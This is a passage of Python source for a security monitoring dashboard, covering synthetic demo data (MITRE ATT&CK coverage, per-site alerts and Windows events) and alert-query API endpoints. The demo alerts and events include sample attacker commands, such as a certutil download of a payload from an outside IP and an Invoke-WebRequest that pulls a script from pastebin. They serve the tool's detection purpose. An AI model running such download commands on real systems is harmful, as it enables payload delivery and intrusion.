                "Verify 198.51.100.22 is not a known remote worker IP",
                "Consider restricting RDP to VPN-only access",
                "Enable Network Level Authentication (NLA) if not already active",
            ],
        },
    ]}


def _demo_threat_intel_status() -> dict:
    return {
        "ok": True,
        "providers": [
            {"name": "AbuseIPDB", "configured": True, "available": True, "quota_remaining": 847},
            {"name": "AlienVault OTX", "configured": True, "available": True, "quota_remaining": -1},
            {"name": "GreyNoise Community", "configured": True, "available": True, "quota_remaining": 7},
        ],
        "cache": {"total_entries": 23, "error": None},
    }


def _demo_mitre_coverage() -> dict:
    """Synthetic MITRE ATT&CK coverage: 33 techniques across 11 tactics."""
    _tactics = [
        ("TA0001", "Initial Access", [("T1078", "Valid Accounts"), ("T1190", "Exploit Public-Facing Application"), ("T1566", "Phishing")]),
        ("TA0002", "Execution", [("T1059", "Command and Scripting Interpreter"), ("T1059.001", "PowerShell"), ("T1204", "User Execution"), ("T1053", "Scheduled Task/Job")]),
        ("TA0003", "Persistence", [("T1053.005", "Scheduled Task"), ("T1136", "Create Account"), ("T1136.001", "Local Account"), ("T1547", "Boot or Logon Autostart Execution")]),
        ("TA0004", "Privilege Escalation", [("T1078.003", "Local Accounts"), ("T1548", "Abuse Elevation Control Mechanism")]),
        ("TA0005", "Defense Evasion", [("T1562", "Impair Defenses"), ("T1562.001", "Disable or Modify Tools"), ("T1027", "Obfuscated Files or Information"), ("T1070", "Indicator Removal")]),
        ("TA0006", "Credential Access", [("T1110", "Brute Force"), ("T1110.001", "Password Guessing"), ("T1003", "OS Credential Dumping")]),
        ("TA0007", "Discovery", [("T1087", "Account Discovery"), ("T1083", "File and Directory Discovery"), ("T1057", "Process Discovery")]),
        ("TA0008", "Lateral Movement", [("T1021", "Remote Services"), ("T1021.001", "Remote Desktop Protocol")]),
        ("TA0009", "Collection", [("T1005", "Data from Local System"), ("T1119", "Automated Collection")]),
        ("TA0010", "Exfiltration", [("T1041", "Exfiltration Over C2 Channel")]),
        ("TA0011", "Command and Control", [("T1071", "Application Layer Protocol"), ("T1571", "Non-Standard Port"), ("T1105", "Ingress Tool Transfer")]),
    ]
    # Build techniques dict keyed by technique ID
    techniques = {}
    rule_map = {
        "T1078": ["auth_failed_burst"], "T1190": ["web_exploit_attempt"],
        "T1566": ["phishing_attachment"], "T1059": ["suspicious_cmd_exec"],
        "T1059.001": ["ps_script_block", "ps_encoded_command"],
        "T1204": ["user_exec_macro"], "T1053": ["scheduled_task_created"],
        "T1053.005": ["scheduled_task_created"], "T1136": ["local_account_created"],
        "T1136.001": ["local_account_created"], "T1547": ["autostart_registry"],
        "T1078.003": ["auth_failed_burst"], "T1548": ["uac_bypass"],
        "T1562": ["defender_realtime_disabled"], "T1562.001": ["defender_realtime_disabled"],
        "T1027": ["obfuscated_command"], "T1070": ["log_cleared"],
        "T1110": ["brute_force_logon", "rdp_brute_force"],
        "T1110.001": ["brute_force_logon"], "T1003": ["credential_dump_attempt"],
        "T1087": ["account_enumeration"], "T1083": ["fim_file_modified"],
        "T1057": ["process_enumeration"], "T1021": ["rdp_brute_force"],
        "T1021.001": ["rdp_brute_force"], "T1005": ["fim_file_modified"],
        "T1119": ["automated_collection"], "T1041": ["c2_exfil_detection"],
        "T1071": ["c2_beacon_detection"], "T1571": ["nonstandard_port"],
        "T1105": ["ingress_tool_transfer"],
    }
    for _tid, _tname, _techs in _tactics:
        for tid, tname in _techs:
            techniques[tid] = {
                "name": tname, "tactic": _tid,
                "rules": rule_map.get(tid, ["generic_detection"]),
            }
    tactic_summary = []
    for tid, label, techs in _tactics:
        tactic_summary.append({
            "tactic": tid, "label": label,
            "techniques_covered": len(techs),
            "technique_ids": [t[0] for t in techs],
        })
    return {
        "ok": True,
        "total_techniques": len(techniques),
        "total_tactics": len(_tactics),
        "techniques": techniques,
        "tactic_summary": tactic_summary,
        "rules_without_mitre": [],
    }


# ---------------------------------------------------------------------------
# Phase 18 M4: Per-site demo data generators
# ---------------------------------------------------------------------------
_DEMO_SITE_HOSTS = {
    "head-office": [
        {"hostname": "RECEPTION-PC", "role": "workstation", "events": 12400, "uptime": "3d 8h 15m"},
        {"hostname": "EXEC-LAPTOP", "role": "workstation", "events": 12180, "uptime": "1d 22h 45m"},
    ],
    "branch-north": [
        {"hostname": "BRANCH-PC-01", "role": "workstation", "events": 4200, "uptime": "7d 2h 10m"},
        {"hostname": "BRANCH-PC-02", "role": "workstation", "events": 3920, "uptime": "7d 2h 10m"},
    ],
    "warehouse": [
        {"hostname": "SHIPPING-PC", "role": "workstation", "events": 18400, "uptime": "5d 11h 0m"},
        {"hostname": "INVENTORY-SERVER", "role": "server", "events": 22100, "uptime": "14d 6h 30m"},
        {"hostname": "LOGISTICS-DB", "role": "server", "events": 11840, "uptime": "14d 6h 30m"},
    ],
}

_DEMO_SITE_ALERTS = {
    "head-office": {
        "severity": {"critical": 2, "high": 5, "medium": 4, "low": 3},
        "top_rules": [
            {"rule": "brute_force_password", "count": 5},
            {"rule": "ps_encoded_command", "count": 3},
            {"rule": "fim_file_modified", "count": 2},
        ],
        "alerts_detail": [
            {"offset": -6, "rule_id": "TS-001", "rule_name": "brute_force_password",
             "severity": "critical", "host": "RECEPTION-PC",
             "description": "12 failed logon attempts from 198.51.100.44 for user admin in 3 minutes",
             "event_count": 12, "matched_events": 12},
            {"offset": -4, "rule_id": "TS-030", "rule_name": "ps_encoded_command",
             "severity": "critical", "host": "EXEC-LAPTOP",
             "description": "PowerShell encoded command execution detected on attorney workstation",
             "event_count": 2, "matched_events": 2},
            {"offset": -3, "rule_id": "TS-030", "rule_name": "ps_encoded_command",
             "severity": "high", "host": "RECEPTION-PC",
             "description": "PowerShell encoded command: Invoke-WebRequest to external IP",
             "event_count": 1, "matched_events": 1},
            {"offset": -2.5, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
             "severity": "medium", "host": "RECEPTION-PC",
             "description": "File modified: C:\\ClientFiles\\Active\\billing.xlsx",
             "event_count": 1, "matched_events": 1},
            {"offset": -1, "rule_id": "TS-071", "rule_name": "rdp_brute_force",
             "severity": "high", "host": "EXEC-LAPTOP",
             "description": "Off-hours RDP connection attempt from 203.0.113.99",
             "event_count": 3, "matched_events": 3},
        ],
    },
    "branch-north": {
        "severity": {"critical": 0, "high": 1, "medium": 1, "low": 1},
        "top_rules": [
            {"rule": "off_hours_logon", "count": 1},
            {"rule": "local_account_created", "count": 1},
        ],
        "alerts_detail": [
            {"offset": -8, "rule_id": "TS-040", "rule_name": "off_hours_logon",
             "severity": "high", "host": "BRANCH-PC-01",
             "description": "Logon outside business hours: user dental_admin at 02:14 AM",
             "event_count": 1, "matched_events": 1},
            {"offset": -5, "rule_id": "TS-010", "rule_name": "local_account_created",
             "severity": "medium", "host": "BRANCH-PC-02",
             "description": "New local account created: xray_service",
             "event_count": 1, "matched_events": 1},
            {"offset": -2, "rule_id": "TS-132", "rule_name": "scheduled_task_created",
             "severity": "low", "host": "BRANCH-PC-01",
             "description": "Scheduled task created: DentalSync_Backup",
             "event_count": 1, "matched_events": 1},
        ],
    },
    "warehouse": {
        "severity": {"critical": 3, "high": 8, "medium": 12, "low": 8},
        "top_rules": [
            {"rule": "suspicious_powershell", "count": 6},
            {"rule": "brute_force_password", "count": 5},
            {"rule": "fim_file_modified", "count": 4},
            {"rule": "defender_realtime_disabled", "count": 3},
        ],
        "alerts_detail": [
            {"offset": -10, "rule_id": "TS-001", "rule_name": "brute_force_password",
             "severity": "critical", "host": "INVENTORY-SERVER",
             "description": "20 failed logon attempts from 192.0.2.15 for user claims_admin in 2 minutes",
             "event_count": 20, "matched_events": 20},
            {"offset": -8, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
             "severity": "critical", "host": "LOGISTICS-DB",
             "description": "File modified: C:\\PolicyData\\underwriting\\master_rates.xlsx — integrity violation",
             "event_count": 1, "matched_events": 1},
            {"offset": -7, "rule_id": "TS-080", "rule_name": "defender_realtime_disabled",
             "severity": "critical", "host": "SHIPPING-PC",
             "description": "Windows Defender real-time protection disabled",
             "event_count": 1, "matched_events": 1},
            {"offset": -5, "rule_id": "TS-030", "rule_name": "suspicious_powershell",
             "severity": "high", "host": "SHIPPING-PC",
             "description": "Suspicious PowerShell: certutil -urlcache -split -f http://192.0.2.15/payload",
             "event_count": 1, "matched_events": 1},
            {"offset": -3, "rule_id": "TS-071", "rule_name": "rdp_brute_force",
             "severity": "high", "host": "INVENTORY-SERVER",
             "description": "Multiple RDP connections from external IP 203.0.113.88",
             "event_count": 5, "matched_events": 5},
            {"offset": -1.5, "rule_id": "TS-030", "rule_name": "suspicious_powershell",
             "severity": "high", "host": "INVENTORY-SERVER",
             "description": "PowerShell downloading from paste site: Invoke-WebRequest pastebin.com/raw/...",
             "event_count": 1, "matched_events": 1},
            {"offset": -0.5, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
             "severity": "medium", "host": "LOGISTICS-DB",
             "description": "File modified: C:\\PolicyData\\claims\\pending_review.csv",
             "event_count": 1, "matched_events": 1},
        ],
    },
}

_DEMO_SITE_EVENTS = {
    "head-office": [
        {"channel": "Security", "event_id": "4625", "host": "RECEPTION-PC",
         "message": "An account failed to log on. Subject: SYSTEM. Failure Reason: Unknown user name. Account: admin. Source: 198.51.100.44."},
        {"channel": "Security", "event_id": "4624", "host": "EXEC-LAPTOP",
         "message": "An account was successfully logged on. Subject: SYSTEM. Logon Type: 10. New Logon: partner1."},
        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "host": "EXEC-LAPTOP",
         "message": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -enc SQBuAH..."},
        {"channel": "TinySocs-FIM", "event_id": "FIM", "host": "RECEPTION-PC",
         "message": "File modified: C:\\ClientFiles\\Active\\billing.xlsx. Action: Modified."},
        {"channel": "Security", "event_id": "4688", "host": "RECEPTION-PC",
         "message": "A new process has been created. Creator: explorer.exe. New Process: outlook.exe."},
    ],
    "branch-north": [
        {"channel": "Security", "event_id": "4624", "host": "BRANCH-PC-01",
         "message": "An account was successfully logged on. Logon Type: 2. New Logon: dental_admin."},
        {"channel": "Security", "event_id": "4720", "host": "BRANCH-PC-02",
         "message": "A user account was created. New Account: xray_service. Created By: Administrator."},
        {"channel": "System", "event_id": "7045", "host": "BRANCH-PC-01",
         "message": "A service was installed: DentalSync_Backup. Service Type: user mode service."},
        {"channel": "Security", "event_id": "4688", "host": "BRANCH-PC-02",
         "message": "A new process has been created. Creator: services.exe. New Process: xray_imaging.exe."},
    ],
    "warehouse": [
        {"channel": "Security", "event_id": "4625", "host": "INVENTORY-SERVER",
         "message": "An account failed to log on. Failure Reason: Unknown user name. Account: claims_admin. Source: 192.0.2.15."},
        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "host": "SHIPPING-PC",
         "message": "Process Create: Image: certutil.exe CommandLine: certutil -urlcache -split -f http://192.0.2.15/payload"},
        {"channel": "TinySocs-FIM", "event_id": "FIM", "host": "LOGISTICS-DB",
         "message": "File modified: C:\\PolicyData\\underwriting\\master_rates.xlsx. Action: Modified. Hash changed."},
        {"channel": "Security", "event_id": "4624", "host": "INVENTORY-SERVER",
         "message": "An account was successfully logged on. Logon Type: 10. New Logon: claims_admin."},
        {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104", "host": "INVENTORY-SERVER",
         "message": "Script block logging: Invoke-WebRequest https://pastebin.com/raw/abc123 -OutFile C:\\Temp\\update.ps1"},
        {"channel": "Security", "event_id": "5001", "host": "SHIPPING-PC",
         "message": "Windows Defender Real-Time Protection was disabled."},
    ],
}


def _demo_site_alerts_summary(site_id: str, hours: int = 24) -> dict:
    """Per-site alert summary for drill-through."""
    site = _DEMO_SITE_ALERTS.get(site_id)
    if not site:
        return {"error": f"Unknown site: {site_id}"}
    sev = site["severity"]
    total = sum(sev.values())
    hosts = _DEMO_SITE_HOSTS.get(site_id, [])
    host_counts = {}
    for a in site.get("alerts_detail", []):
        host_counts[a["host"]] = host_counts.get(a["host"], 0) + 1
    return {
        "hours": hours,
        "total": total,
        "severity": {k: v for k, v in sev.items() if v > 0},
        "top_rules": site["top_rules"],
        "top_hosts": [{"host": h, "count": c} for h, c in
                      sorted(host_counts.items(), key=lambda x: -x[1])],
        "error": None,
    }


def _demo_site_alerts_timeline(site_id: str, hours: int = 24) -> dict:
    """Per-site alert timeline for drill-through."""
    site = _DEMO_SITE_ALERTS.get(site_id)
    if not site:
        return {"error": f"Unknown site: {site_id}"}
    now = _demo_now()
    td = __import__("datetime").timedelta
    sev = site["severity"]
    total = sum(sev.values())
    # Scale factor: distribute alerts across hours with business-hours bias
    scale = max(1, total / 12)  # rough average per-hour
    buckets = []
    for i in range(hours):
        t = now + td(hours=-(hours - 1 - i))
        hour = t.hour
        if 8 <= hour <= 17:
            base = max(0, int(scale * random.uniform(0.5, 1.5)))
        elif 22 <= hour or hour <= 5:
            base = max(0, int(scale * random.uniform(0, 0.3)))
        else:
            base = max(0, int(scale * random.uniform(0.2, 0.7)))
        bsev = {}
        if base > 0:
            crit_ratio = sev.get("critical", 0) / max(1, total)
            high_ratio = sev.get("high", 0) / max(1, total)
            bsev_crit = max(0, int(base * crit_ratio + random.uniform(-0.5, 0.5)))
            bsev_high = max(0, int(base * high_ratio + random.uniform(-0.5, 0.5)))
            bsev_other = max(0, base - bsev_crit - bsev_high)
            if bsev_crit > 0:
                bsev["critical"] = bsev_crit
            if bsev_high > 0:
                bsev["high"] = bsev_high
            if bsev_other > 0:
                bsev["medium"] = bsev_other
        buckets.append({
            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
            "count": base,
            "severity": bsev,
        })
    return {"hours": hours, "buckets": buckets, "error": None}


def _demo_site_fleet_health(site_id: str) -> dict:
    """Per-site fleet health for drill-through."""
    hosts_cfg = _DEMO_SITE_HOSTS.get(site_id)
    if not hosts_cfg:
        return {"error": f"Unknown site: {site_id}"}
    site_alerts = _DEMO_SITE_ALERTS.get(site_id, {})
    # Count alerts per host
    host_alert_counts: Dict[str, Dict[str, int]] = {}
    for a in site_alerts.get("alerts_detail", []):
        h = a["host"]
        if h not in host_alert_counts:
            host_alert_counts[h] = {"total": 0}
        host_alert_counts[h]["total"] += 1
        s = a["severity"]
        host_alert_counts[h][s] = host_alert_counts[h].get(s, 0) + 1

    hosts = []
    for hcfg in hosts_cfg:
        hn = hcfg["hostname"]
        ac = host_alert_counts.get(hn, {"total": 0})
        sev_dict = {k: v for k, v in ac.items() if k != "total"}
        hosts.append({
            "hostname": hn,
            "event_count": hcfg["events"],
            "last_seen": _demo_iso(-0.02),
            "first_seen": _demo_iso(-23.5),
            "alert_count": ac.get("total", 0),
            "alert_severities": sev_dict,
            "active_detections": [],
            "top_channels": [
                {"channel": "Security", "count": int(hcfg["events"] * 0.55)},
                {"channel": "Microsoft-Windows-Sysmon/Operational", "count": int(hcfg["events"] * 0.30)},
                {"channel": "System", "count": int(hcfg["events"] * 0.15)},
            ],
            "top_event_ids": [
                {"event_id": "4624", "count": int(hcfg["events"] * 0.25)},
                {"event_id": "1", "count": int(hcfg["events"] * 0.20)},
            ],
            "agent_version": "0.9.0" if site_id != "warehouse" else "0.8.9",
            "node_id": site_id,
            "uptime": hcfg["uptime"],
            "events_shipped": hcfg["events"],
            "queue_files": 0,
            "queue_bytes": 0,
            "last_ship_time": _demo_iso(-0.02),
            "heartbeat_ts": _demo_iso(-0.01),
        })
    return {"hosts": hosts, "error": None}


def _demo_site_detections_fired(site_id: str, hours: int = 24, limit: int = 50) -> dict:
    """Per-site fired detections for drill-through."""
    site = _DEMO_SITE_ALERTS.get(site_id)
    if not site:
        return {"error": f"Unknown site: {site_id}"}
    detections = []
    for idx, a in enumerate(site.get("alerts_detail", [])):
        det_id = f"demo-{site_id}-{idx:04d}"
        alert_id = f"{a['rule_id']}|{a['host']}|{_demo_iso(a['offset'])}"
        detections.append({
            "id": det_id,
            "alert_id": alert_id,
            "rule_id": a["rule_id"],
            "rule_name": a["rule_name"],
            "severity": a["severity"],
            "description": a["description"],
            "event_count": a["event_count"],
            "first_seen": _demo_iso(a["offset"] - 0.1),
            "last_seen": _demo_iso(a["offset"]),
            "timestamp": _demo_iso(a["offset"]),
            "host": a["host"],
            "matched_events": a["matched_events"],
            "status": "new",
            "tags": [],
            "notes": "",
        })
    return {"detections": detections[:limit], "total": len(detections), "error": None}


def _demo_site_events_recent(site_id: str, limit: int = 50) -> dict:
    """Per-site recent events for drill-through."""
    templates = _DEMO_SITE_EVENTS.get(site_id)
    if not templates:
        return {"error": f"Unknown site: {site_id}"}
    td = __import__("datetime").timedelta
    now = _demo_now()
    events = []
    for i in range(min(limit, 50)):
        tmpl = templates[i % len(templates)]
        t = now - td(minutes=random.randint(1, 1400))
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "host": tmpl["host"],
            "channel": tmpl["channel"],
            "event_id": tmpl["event_id"],
            "message": tmpl["message"][:300],
        })
    events.sort(key=lambda e: e["timestamp"], reverse=True)
    return {"events": events, "total": len(events), "index": "tinysocs-winlog-*", "error": None}


def _demo_site_host_timeline(site_id: str, hostname: str = "", hours: int = 24) -> dict:
    """Per-site host timeline for drill-through."""
    hosts_cfg = _DEMO_SITE_HOSTS.get(site_id)
    if not hosts_cfg:
        return {"error": f"Unknown site: {site_id}"}
    now = _demo_now()
    td = __import__("datetime").timedelta
    channels = ["Security", "Microsoft-Windows-Sysmon/Operational", "System"]
    # Scale based on site size
    host_events = {h["hostname"]: h["events"] for h in hosts_cfg}
    total_events = sum(host_events.values())
    scale = total_events / max(1, len(hosts_cfg)) / 24  # rough hourly average per host
    buckets = []
    for i in range(hours):
        t = now + td(hours=-(hours - 1 - i))
        hour = t.hour
        if 8 <= hour <= 17:
            mult = random.uniform(1.0, 2.0)
        else:
            mult = random.uniform(0.2, 0.6)
        sec = max(0, int(scale * 0.55 * mult))
        sys_ch = max(0, int(scale * 0.30 * mult))
        other = max(0, int(scale * 0.15 * mult))
        ch = {"Security": sec, "Microsoft-Windows-Sysmon/Operational": sys_ch}
        if other > 0:
            ch["System"] = other
        buckets.append({
            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
            "count": sum(ch.values()),
            "channels": ch,
        })
    return {
        "hostname": hostname,
        "hours": hours,
        "interval": "1h",
        "buckets": buckets,
        "channels": sorted(channels),
        "error": None,
    }


def _demo_nodes() -> dict:
    """Synthetic multi-site data for the Sites tab (Phase 18: enriched with operational data)."""
    nodes = [
        {
            "url": "https://acme-node:8081",
            "node_id": "head-office",
            "version": "0.9.0",
            "status": "healthy",
            "ledger_sequence": 347,
            "ledger_head": "a3f2c9e1d4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1",
            "last_anchor_at": _demo_iso(-0.2),
            "last_anchor_items": 2,
            "reachable": True,
            "error": None,
            # Phase 18 M1: operational data
            "alerts_24h": 14, "alerts_critical": 2, "alerts_high": 5,
            "alerts_medium": 4, "alerts_low": 3,
            "top_rule": "brute_force_password", "host_count": 2,
            "total_events_24h": 24580,
        },
        {
            "url": "https://dental-node:8081",
            "node_id": "branch-north",
            "version": "0.9.0",
            "status": "healthy",
            "ledger_sequence": 189,
            "ledger_head": "b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3",
            "last_anchor_at": _demo_iso(-0.3),
            "last_anchor_items": 0,
            "reachable": True,
            "error": None,
            "alerts_24h": 3, "alerts_critical": 0, "alerts_high": 1,
            "alerts_medium": 1, "alerts_low": 1,
            "top_rule": "off_hours_logon", "host_count": 2,
            "total_events_24h": 8120,
        },
        {
            "url": "https://harbor-node:8081",
            "node_id": "warehouse",
            "version": "0.8.9",
            "status": "warning",
            "ledger_sequence": 512,
            "ledger_head": "c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4",
            "last_anchor_at": _demo_iso(-1.5),
            "last_anchor_items": 5,
            "reachable": True,
            "error": None,
            "alerts_24h": 31, "alerts_critical": 3, "alerts_high": 8,
            "alerts_medium": 12, "alerts_low": 8,
            "top_rule": "suspicious_powershell", "host_count": 3,
            "total_events_24h": 52340,
        },
    ]
    # Compute aggregate
    agg = {
        "total_alerts_24h": sum(n["alerts_24h"] for n in nodes),
        "total_critical": sum(n["alerts_critical"] for n in nodes),
        "total_high": sum(n["alerts_high"] for n in nodes),
        "total_medium": sum(n["alerts_medium"] for n in nodes),
        "total_low": sum(n["alerts_low"] for n in nodes),
        "total_hosts": sum(n["host_count"] for n in nodes),
        "sites_healthy": sum(1 for n in nodes if n["status"] == "healthy"),
        "sites_warning": sum(1 for n in nodes if n["status"] == "warning"),
        "sites_unreachable": 0,
    }
    return {"nodes": nodes, "aggregate": agg}


# ---------------------------------------------------------------------------
# Data API endpoints (no auth — local operator tool)
# ---------------------------------------------------------------------------
_LOCAL_NODE_ID = os.getenv("TINYSOCS_NODE_ID") or os.getenv("COMPUTERNAME") or "local"


@dashboard_app.get("/api/local-meta")
def api_local_meta():
    """Return the local node ID so the frontend can detect local-site focus."""
    return {"node_id": _LOCAL_NODE_ID}


@dashboard_app.get("/api/alerts/timeline")
async def api_alert_timeline(
    hours: int = Query(24, ge=1, le=720),
    hostname: Optional[str] = Query(None),
):
    """Alert counts bucketed by hour and severity."""
    if _DEMO_MODE:
        return _demo_alerts_timeline(hours)
    host_filter = _alert_host_filter(hostname)
    time_filter: Dict[str, Any] = {"range": {"timestamp": {"gte": f"now-{hours}h", "lte": "now"}}}
    body = {
        "query": {"bool": {"filter": [time_filter] + host_filter}},
        "aggs": {
            "timeline": {
                "date_histogram": {"field": "timestamp", "fixed_interval": "1h", "min_doc_count": 0},
                "aggs": {
                    "by_severity": {"terms": {"field": "alert.severity", "size": 10}}
                },
            }
        },
    }
    resp = await _safe_query_async("tinysocs-alerts-*", body)
    buckets = resp.get("aggregations", {}).get("timeline", {}).get("buckets", [])
    local_buckets = [
        {
            "time": b.get("key_as_string", ""),
            "count": b.get("doc_count", 0),
            "severity": {
                s["key"]: s["doc_count"]
                for s in b.get("by_severity", {}).get("buckets", [])
            },
        }
        for b in buckets
    ]

    # --- Fan-out: merge timeline buckets from all remote nodes (All Sites view) ---
    if _get_node_urls() and not hostname:
        remote_results = await _fan_out_nodes("alerts/timeline", {"hours": str(hours)})
        # Index local buckets by time for merging
        bucket_map: Dict[str, Dict[str, Any]] = {b["time"]: b for b in local_buckets}
        for rd in remote_results:
            for rb in rd.get("buckets", []):
                t = rb.get("time", "")
                if not t:
                    continue
                if t in bucket_map:
                    bucket_map[t]["count"] += rb.get("count", 0)
                    for sev_key, sev_count in rb.get("severity", {}).items():
                        bucket_map[t]["severity"][sev_key] = bucket_map[t]["severity"].get(sev_key, 0) + sev_count
                else:
                    bucket_map[t] = {
                        "time": t,
                        "count": rb.get("count", 0),
                        "severity": dict(rb.get("severity", {})),
                    }
        local_buckets = sorted(bucket_map.values(), key=lambda b: b["time"])

    return {
        "hours": hours,
        "buckets": local_buckets,
        "error": resp.get("error"),
    }


def _alert_host_filter(hostname: Optional[str]) -> List[Dict[str, Any]]:
    """Build filter clauses for alert queries scoped to a hostname."""
    if not hostname:
        return []
    return [{"bool": {"should": [
        {"term": {"source.computer_name.keyword": hostname}},
        {"term": {"host.name": hostname}},
        {"term": {"alert.host": hostname}},
    ], "minimum_should_match": 1}}]


@dashboard_app.get("/api/alerts/summary")
async def api_alert_summary(
    hours: int = Query(24, ge=1, le=720),
    hostname: Optional[str] = Query(None),
):
    """Summary stats: total, by severity, top rules, top hosts."""
    if _DEMO_MODE:
        return _demo_alerts_summary(hours)
    host_filter = _alert_host_filter(hostname)
    # Total + severity
    time_filter: Dict[str, Any] = {"range": {"timestamp": {"gte": f"now-{hours}h", "lte": "now"}}}
    body_sev = {
        "query": {"bool": {"filter": [time_filter] + host_filter}},
        "aggs": {"by_severity": {"terms": {"field": "alert.severity", "size": 10}}},
    }
    resp_sev = await _safe_query_async("tinysocs-alerts-*", body_sev)

    total_hit = resp_sev.get("hits", {}).get("total", {})
    total = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)
    severity = {
        b["key"].lower(): b["doc_count"]
        for b in resp_sev.get("aggregations", {}).get("by_severity", {}).get("buckets", [])
    }

    # Top rules
    body_rules = {
        "query": {"bool": {"filter": [time_filter] + host_filter}},
        "aggs": {"by_rule": {"terms": {"field": "alert.rule_id", "size": 10, "order": {"_count": "desc"}}}},
    }
    resp_rules = await _safe_query_async("tinysocs-alerts-*", body_rules)
    top_rules = [
        {"rule": b["key"], "count": b["doc_count"]}
        for b in resp_rules.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
    ]

    # Top hosts — alerts store host in source.computer_name
    body_hosts = {
        "query": {"bool": {"filter": [time_filter] + host_filter}},
        "aggs": {"by_host": {"terms": {"field": "source.computer_name.keyword", "size": 10, "order": {"_count": "desc"}}}},
    }
    resp_hosts = await _safe_query_async("tinysocs-alerts-*", body_hosts)
    top_hosts = [
        {"host": b["key"], "count": b["doc_count"]}
        for b in resp_hosts.get("aggregations", {}).get("by_host", {}).get("buckets", [])
    ]

    # --- Fan-out: merge alert summaries from all remote nodes (All Sites view) ---
    if _get_node_urls():
        remote_results = await _fan_out_nodes("alerts/summary", {"hours": str(hours)})
        for rd in remote_results:
            total += rd.get("total", 0)
            for sev_key, sev_count in rd.get("severity", {}).items():
                severity[sev_key] = severity.get(sev_key, 0) + sev_count
            for rr in rd.get("top_rules", []):
                existing = next((r for r in top_rules if r["rule"] == rr.get("rule")), None)
                if existing:
                    existing["count"] += rr.get("count", 0)
                else:
                    top_rules.append({"rule": rr.get("rule", ""), "count": rr.get("count", 0)})
            for rh in rd.get("top_hosts", []):
                existing = next((h for h in top_hosts if h["host"] == rh.get("host")), None)
                if existing:
                    existing["count"] += rh.get("count", 0)
                else:
                    top_hosts.append({"host": rh.get("host", ""), "count": rh.get("count", 0)})
        # Re-sort top lists by count descending and trim
        top_rules.sort(key=lambda r: r["count"], reverse=True)
        top_rules = top_rules[:10]
        top_hosts.sort(key=lambda h: h["count"], reverse=True)
        top_hosts = top_hosts[:10]

    return {
        "hours": hours,
        "total": total,
        "severity": severity,
        "top_rules": top_rules,
        "top_hosts": top_hosts,
        "error": resp_sev.get("error"),
    }


@dashboard_app.get("/api/detections/fired")
async def api_detections_fired(
    hours: int = Query(24, ge=1, le=720),
    limit: int = Query(30, ge=1, le=200),
    hostname: Optional[str] = Query(None),
):
    """Fetch individual fired detections with full details."""
    if _DEMO_MODE:
        return _demo_detections_fired(hours, limit)
    host_filter = _alert_host_filter(hostname)
    time_filter: Dict[str, Any] = {"range": {"timestamp": {"gte": f"now-{hours}h", "lte": "now"}}}
    body = {
        "query": {"bool": {"filter": [time_filter] + host_filter}},
        "sort": [{"timestamp": {"order": "desc"}}],
    }
    resp = await _safe_query_async("tinysocs-alerts-*", body, size=limit)
    hits = resp.get("hits", {}).get("hits", [])
    detections = []
    for h in hits:
        src = h.get("_source", {})
        alert = src.get("alert", {})
        detections.append({
            "id": h.get("_id", ""),
            "alert_id": alert.get("id", ""),
            "rule_id": alert.get("rule_id", ""),
            "rule_name": alert.get("rule_name", ""),
            "severity": alert.get("severity", ""),
            "description": alert.get("description", ""),
            "event_count": alert.get("event_count", 0),
            "first_seen": alert.get("first_seen", ""),
            "last_seen": alert.get("last_seen", ""),
            "timestamp": src.get("timestamp", ""),
            "host": (
                src.get("source", {}).get("computer_name")
                or src.get("host", {}).get("name")
                or alert.get("host")
                or ""
            ),
            "matched_events": src.get("matched_events", 0),
        })
    total_hit = resp.get("hits", {}).get("total", 0)
    total = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)

    # Merge in alert states (acknowledge/dismiss/tags)
    _init_alert_state_file()
    for det in detections:
        state = _alert_states.get(det["id"], {})
        det["status"] = state.get("status", "new")
        det["tags"] = state.get("tags", [])
        det["notes"] = state.get("notes", "")

    # --- Fan-out: merge detections from all remote nodes (All Sites view) ---
    if _get_node_urls():
        remote_results = await _fan_out_nodes(
            "detections/fired", {"hours": str(hours), "limit": str(limit)}
        )
        for rd in remote_results:
            for rdet in rd.get("detections", []):
                # Avoid duplicates by alert_id
                if not any(d.get("id") == rdet.get("id") or
                           (d.get("alert_id") and d.get("alert_id") == rdet.get("alert_id"))
                           for d in detections):
                    detections.append(rdet)
            total += rd.get("total", 0)
        # Re-sort by timestamp descending and trim to limit
        detections.sort(key=lambda d: d.get("timestamp", ""), reverse=True)
        detections = detections[:limit]

    return {"detections": detections, "total": total, "error": resp.get("error")}


@dashboard_app.post("/api/detections/{alert_id}/status")
def api_detection_status(alert_id: str, body: Dict[str, Any] = Body(...)):
    """Update the status of a detection: new, acknowledged, dismissed."""
    _init_alert_state_file()
    status = body.get("status", "")
    if status not in ("new", "acknowledged", "dismissed"):
        return JSONResponse(status_code=400, content={"ok": False, "error": "Invalid status"})

    if alert_id not in _alert_states:
        _alert_states[alert_id] = {"tags": [], "notes": ""}
    _alert_states[alert_id]["status"] = status
    _alert_states[alert_id]["updated_at"] = datetime.now(timezone.utc).isoformat()
    _save_alert_states()
    return {"ok": True, "alert_id": alert_id, "status": status}


@dashboard_app.post("/api/detections/{alert_id}/tags")
def api_detection_tags(alert_id: str, body: Dict[str, Any] = Body(...)):
    """Set tags on a detection. Body: {"tags": ["investigating", "false-positive"]}"""
    _init_alert_state_file()
    tags = body.get("tags", [])
    if not isinstance(tags, list):
        return JSONResponse(status_code=400, content={"ok": False, "error": "tags must be a list"})

    if alert_id not in _alert_states:
